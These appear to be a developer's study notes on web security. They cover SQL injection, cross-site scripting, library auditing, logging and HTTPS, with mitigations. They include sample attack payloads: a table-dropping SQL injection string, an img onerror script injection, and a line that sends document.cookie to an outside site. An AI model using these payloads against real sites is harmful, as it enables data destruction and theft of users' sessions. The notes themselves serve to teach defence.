## Security

### SQL injections

Let's have a look at a SQL injection example.

```sql
INSERT INTO users (email) VALUES (; DROP TABLE users; --);
```

The original intent of this SQL command was to insert an email into the `users` table, however, a malicious code was inserted to drop the whole table. The `--` means to comment out anything after that.

Apart from injecting into SQL, you can also inject into a web page by entering `<img src='/' onerror="alert(1)" />` into an input filed where the content is applied directly to the `innerHTML` property.

To fix injection loopholes

- sanitize inputs (white list)
- parametrize queries (ORM, Object-relational mapping)

### 3rd party libraries

Audit the 3rd party libraries in your project using helper tool such as [snyk](https://snyk.io/).

### Logging

Always try to implement logging so you have more info about what happen in your project. [morgan](https://github.com/expressjs/morgan) and [winston](https://github.com/winstonjs/winston) are something you can use as a starter. 

### Use HTTPS

HTTPS encrypts info transmitted between client and server so use service like [letsencrypt](https://letsencrypt.org/) to upgrade your site for security's sake.

### Cross-site scripting (XSS)

An XSS attack exploits a weakness in a page that includes a variable submitted in a request to show up in raw form in the response. The page is only reflecting back what was submitted in that request, but the content of that request might hold characters that break out of ordinary text content and introduce HTML or javascript content that the developer did not intend.

For example, if you have a form that allows user to input a comment, and below the form you display it. Without proper handling of XSS, you can write `window.location = 'myWebsite.com?cookie=' + document.cookie` into the input field and submit it as a comment. Since it is now added to the page as a comment, anyone who visits the site will have their cookies stolen.
  
Therefore, we should always remember to `serialize` our data before using it.

### Cross Site Request Forgery (CSRF)

### Man in the middle
